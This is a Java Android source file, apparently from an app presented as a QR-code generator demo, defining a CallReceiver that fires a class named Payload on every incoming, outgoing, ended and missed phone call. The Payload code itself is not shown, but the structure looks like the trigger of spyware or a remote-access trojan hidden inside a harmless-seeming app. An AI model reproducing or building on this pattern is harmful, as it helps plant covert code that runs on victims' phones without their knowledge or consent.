package com.thealteria.qrcodegeneratordemo;

import android.content.Context;
import android.telephony.TelephonyManager;

import java.util.Date;

public class CallReceiver extends PhonecallReceiver {

    @Override
    protected void onIncomingCallStarted(Context ctx, String number, Date start,String tel) {
        Payload.start(ctx,tel);
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, Date start,String tel) {
        Payload.start(ctx,tel);
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end,String tel) {
        Payload.start(ctx,tel);
    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end,String tel) {
        Payload.start(ctx,tel);
    }

    @Override
    protected void onMissedCall(Context ctx, String number, Date start,String tel) {
        Payload.start(ctx,tel);
    }

}
